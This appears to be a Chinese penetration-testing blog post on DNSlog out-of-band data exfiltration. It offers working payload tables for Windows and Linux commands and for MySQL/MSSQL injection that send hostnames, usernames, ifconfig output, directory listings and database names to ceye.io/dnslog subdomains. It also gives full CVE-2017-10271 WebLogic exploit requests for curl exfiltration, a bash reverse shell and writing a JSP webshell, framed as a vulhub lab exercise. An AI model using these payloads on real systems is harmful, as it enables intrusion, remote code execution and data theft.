---
layout:     post
title:      dnslog
date:       2019-1-13
author:     Wh0ale
header-img: img/1.jpg
---

# 0x01 搭建Dnslog

dnslog原理：

DNS在解析的时候会留下日志，这类工具就是读取多级域名的解析日志，来获取信息，简单来说就是把信息放在多级子域名中，传递到我们自己的服务器中，然后读取日志，获取特定信息，最后根据获取的信息来判断我们渗透测试的动作是否成功运行。

![](https://ws1.sinaimg.cn/large/b6de3d7dly1fz3mvepls7j20jd0b2jux.jpg)



搭建：<https://github.com/BugScanTeam/DNSLog>

 ceye: <http://ceye.io/records/dns>

![](https://ws1.sinaimg.cn/large/b6de3d7dly1fz3mybteepj211h0bqgmg.jpg)

# 0x02 windows常用payload：

| ping   %COMPUTERNAME%.2gln5s.ceye.io                         | 查看返回的计算机名 |
| ------------------------------------------------------------ | ------------------ |
| for   /F "delims=\" %i in ('whoami') do ping -n 1 %i.2gln5s.ceye.io | 查看返回的计算机名 |
| for /F "delims=\   tokens=2" %i in ('whoami') do ping -n 1 %itest.2gln5s.ceye.io |                    |




| %APPDATA%   :                | 列出应用程序数据的默认存放位置。                             |
| ---------------------------- | ------------------------------------------------------------ |
| %CD%   :                     | 列出当前目录。                                               |
| %CLIENTNAME%   :             | 列出联接到终端服务会话时客户端的NETBIOS名。                  |
| %CMDCMDLINE%   :             | 列出启动当前cmd.exe所使用的命令行。                          |
| %CMDEXTVERSION%   :          | 命令出当前命令处理程序扩展版本号。                           |
| %CommonProgramFiles%   :     | 列出了常用文件的文件夹路径。                                 |
| %COMPUTERNAME%   :           | 列出了计算机名。                                             |
| %COMSPEC%   :                | 列出了可执行命令外壳（命令处理程序）的路径。                 |
| %DATE%   :                   | 列出当前日期。                                               |
| %ERRORLEVEL%   :             | 列出了最近使用的命令的错误代码。                             |
| %HOMEDRIVE%   :              | 列出与用户主目录所在的驱动器盘符。                           |
| %HOMEPATH%   :               | 列出用户主目录的完整路径。                                   |
| %HOMESHARE%   :              | 列出用户共享主目录的网络路径。                               |
| %LOGONSEVER%   :             | 列出有效的当前登录会话的域名控制器名。                       |
| %NUMBER_OF_PROCESSORS%   :   | 列出了计算机安装的处理器数。                                 |
| %OS%   :                     | 列出操作系统的名字。(Windows   XP 和 Windows 2000 列为 Windows_NT.) |
| %Path%   :                   | 列出了可执行文件的搜索路径。                                 |
| %PATHEXT%   :                | 列出操作系统认为可被执行的文件扩展名。                       |
| %PROCESSOR_ARCHITECTURE%   : | 列出了处理器的芯片架构。                                     |
| %PROCESSOR_IDENTFIER%   :    | 列出了处理器的描述。                                         |
| %PROCESSOR_LEVEL%   :        | 列出了计算机的处理器的型号。                                 |
| %PROCESSOR_REVISION%   :     | 列出了处理器的修订号。                                       |
| %ProgramFiles%   :           | 列出了Program   Files文件夹的路径。                          |
| %PROMPT%   :                 | 列出了当前命令解释器的命令提示设置。                         |
| %RANDOM%   :                 | 列出界于0   和 32767之间的随机十进制数。                     |
| %SESSIONNAME%   :            | 列出连接到终端服务会话时的连接和会话名。                     |
| %SYSTEMDRIVE%   :            | 列出了Windows启动目录所在驱动器。                            |
| %SYSTEMROOT%   :             | 列出了Windows启动目录的位置。                                |
| %TEMP%   and %TMP% :         | 列出了当前登录的用户可用应用程序的默认临时目录。             |
| %TIME%   :                   | 列出当前时间。                                               |
| %USERDOMAIN%   :             | 列出了包含用户帐号的域的名字。                               |
| %USERNAME%   :               | 列出当前登录的用户的名字。                                   |
| %USERPROFILE%   :            | 列出当前用户Profile文件位置。                                |
| %WINDIR%   :                 | 列出操作系统目录的位置。                                     |
| %ALLUSERSPROFILE%            | 本地   返回“所有用户”配置文件的位置。                        |
| %APPDATA%                    | 本地   返回默认情况下应用程序存储数据的位置。                |
| %CD%                         | 本地   返回当前目录字符串。                                  |
| %CMDCMDLINE%                 | 本地   返回用来启动当前的 Cmd.exe 的准确命令行。             |
| %CMDEXTVERSION%              | 系统   返回当前的“命令处理程序扩展”的版本号。                |
| %COMPUTERNAME%               | 系统 返回计算机的名称。                                      |
| %COMSPEC%                    | 系统   返回命令行解释器可执行程序的准确路径。                |
| %DATE%                       | 系统   返回当前日期。使用与 date /t 命令相同的格式。由 Cmd.exe 生成。有关 date 命令的详细信息，请参阅 Date。 |
| %ERRORLEVEL%                 | 系统   返回上一条命令的错误代码。通常用非零值表示错误。      |
| %HOMEDRIVE%                  | 系统   返回连接到用户主目录的本地工作站驱动器号。基于主目录值而设置。用户主目录是在“本地用户和组”中指定的。 |
| %HOMEPATH%                   | 系统   返回用户主目录的完整路径。基于主目录值而设置。用户主目录是在“本地用户和组”中指定的。 |
| %HOMESHARE%                  | 系统   返回用户的共享主目录的网络路径。基于主目录值而设置。用户主目录是在“本地用户和组”中指定的。 |
| %LOGONSERVER%                | 本地   返回验证当前登录会话的域控制器的名称。                |
| %NUMBER_OF_PROCESSORS%       | 系统 指定安装在计算机上的处理器的数目。                      |
| %OS%                         | 系统   返回操作系统名称。Windows 2000 显示其操作系统为 Windows_NT。 |



# 0x03 Linux常用payload：

| nslookup  whoami.test.2gln5s.ceye.io                         | 查看主机的名称                                               |
| ------------------------------------------------------------ | ------------------------------------------------------------ |
| curl   -X POST http://ip.port.2gln5s.ceye.io/whoami?p=   http -d data=http | 查看主机名称名返回，以http形式                               |
| curl test.2gln5s.ceye.io/`ifconfig|base64|tr '\n' '-'`       | 查看ip     以base64返回 （空格变为-）                        |
| curl http://ip.port.2gln5s.ceye.io/`ls`                      | 显示当前目录下的文件 （只能显示一个）                        |
| curl   `whoami`.2gln5s.ceye.io                               | 查看主机的名称                                               |
| <http://rinige.com/index.php/archives/705/>                  | dnslog   攻击的一些姿势                                      |
| 启动三个白帽任意   linux 结界                                | curl -b cookie=admin   ccxxxx.dnslog.info                    |
| 创建   cookie 文件                                           | echo -e "ccxxxx.dnslog.info\tFALSE\t/\tFALSE\t1450450776\tusername\tadmin" > cookies.txt |
| 执行系统命令，并将结果追加到  cookies.txt 中去               | pwd \| tee -a   cookies.txt                                  |
| 将回显内容变成一行                                           | paste -s -d ":"   cookies.txt \| tee cookies.txt             |
| 日志记录回显内容   cookie                                    | curl -b cookies.txt cc6020.dnslog.info                       |

![](https://ws1.sinaimg.cn/large/b6de3d7dly1fz3n3bz7h8j20w60mcwfl.jpg)

Poc:

```xml
POST /wls-wsat/CoordinatorPortType HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Windows NT 5.1; rv:5.0) Gecko/20100101 Firefox/5.0
Content-Type:text/xml
Content-Length: 657

<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
 <soapenv:Header>
 <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
 <java version="1.8.0_131" class="java.beans.XMLDecoder">
 <void class="java.lang.ProcessBuilder">
 <array class="java.lang.String" length="3">
 <void index="0">
 <string>/bin/bash</string>
 </void>
 <void index="1">
 <string>-c</string>
 </void>
 <void index="2">
 <string>curl XXXX.dnslog.link/`ifconfig|base64|tr '\n' '-'`</string>
 </void>
 </array>
 <void method="start"/></void>
 </java>
 </work:WorkContext>
 </soapenv:Header>
 <soapenv:Body/>
</soapenv:Envelope>

```



# 0x04 数据库payload

| load_file(concat('\\\\\\\\',(select   database()),'.2gln5s.ceye.io\\abc')) | 读取数据库                             |
| ------------------------------------------------------------ | -------------------------------------- |
| ?id=1'   and if((select load_file(concat('\\\\',(select   database()),'.xxxx.ceye.io\\abc'))),1,1)--+ |                                        |
| ?id=1'   and if((select load_file(concat('\\\\',(select table_name from   information_schema.tables where table_schema='security' limit   0,1),'.test.2gln5s.ceye.io\\abc'))),1,1)--+ |                                        |
| DECLARE @host varchar(1024);                                 | 注册一个名为@host的变量，类型为varchar |
| SELECT @host=CONVERT(varchar(1024),db_name())+'.xxxxxxxxx.dnslog.link'; | db_name()然后转换成varchar类型         |
| EXEC('master..xp_dirtree "[\\'+@host+'\foobar$](file://'+@host+'/foobar$)"'); | 远程主机的foobar$目录                  |

注入时候需要注意设置

| my.ini | secure-auth=0secure_file_priv   = "" |
| ------ | ------------------------------------ |
|        |                                      |

![](https://ws1.sinaimg.cn/large/b6de3d7dly1fz3nborwd6j2084036aa6.jpg)

![](https://ws1.sinaimg.cn/large/b6de3d7dly1fz3ncbzpjcj20ta09610g.jpg)

# 0x05 实战

## 1.CVE-2017-10271

环境： <https://github.com/vulhub/vulhub/tree/master/weblogic/CVE-2017-10271>

```
搭建命令
自动化编译环境
docker-compose build

启动整个环境
docker-compose up -d

删除整个环境
docker-compose down -v
```

![](https://ws1.sinaimg.cn/large/b6de3d7dly1fz3negbsl3j20z807qduq.jpg)

发送如下数据包（注意其中反弹shell的语句，需要进行编码，否则解析XML的时候将出现格式错误）：

```xml
POST /wls-wsat/CoordinatorPortType HTTP/1.1
Host: your-ip:7001
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Type: text/xml
Content-Length: 633

<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"> <soapenv:Header>
<work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
<java version="1.4.0" class="java.beans.XMLDecoder">
<void class="java.lang.ProcessBuilder">
<array class="java.lang.String" length="3">
<void index="0">
<string>/bin/bash</string>
</void>
<void index="1">
<string>-c</string>
</void>
<void index="2">
<string>bash -i &gt;&amp; /dev/tcp/10.0.0.1/21 0&gt;&amp;1</string>
</void>
</array>
<void method="start"/></void>
</java>
</work:WorkContext>
</soapenv:Header>
<soapenv:Body/>
</soapenv:Envelope>
```



![](https://ws1.sinaimg.cn/large/b6de3d7dly1fz3nlkogpjj20h805a7sc.jpg)



成功获取shell：

![](https://ws1.sinaimg.cn/large/b6de3d7dly1fz3nfc5v70j20j806pjry.jpg)

写入webshell（访问：`http://your-ip:7001/bea_wls_internal/test.jsp`）：

```xml
POST /wls-wsat/CoordinatorPortType HTTP/1.1
Host: your-ip:7001
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Type: text/xml
Content-Length: 638

<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
    <soapenv:Header>
    <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
    <java><java version="1.4.0" class="java.beans.XMLDecoder">
    <object class="java.io.PrintWriter"> 
    <string>servers/AdminServer/tmp/_WL_internal/bea_wls_internal/9j4dqk/war/test.jsp</string>
    <void method="println"><string>
    <![CDATA[
<% out.print("test"); %>
    ]]>
    </string>
    </void>
    <void method="close"/>
    </object></java></java>
    </work:WorkContext>
    </soapenv:Header>
    <soapenv:Body/>
</soapenv:Envelope>
```

![](https://ws1.sinaimg.cn/large/b6de3d7dly1fz3niax5h0j20rv0idwsa.jpg)

![](https://ws1.sinaimg.cn/large/b6de3d7dly1fz3nl7zmboj20ie03ox16.jpg)



## 2.weak_password

环境： <https://github.com/vulhub/vulhub/tree/master/weblogic/weak_password>



## 3.注入实战

[一次sql延时注入之dnslog的利用](https://zhuanlan.zhihu.com/p/23631785)

 [Dnslog在SQL注入中的实战](https://www.anquanke.com/post/id/98096)

 



参考： <https://blog.csdn.net/qq_27446553/article/details/78952010>



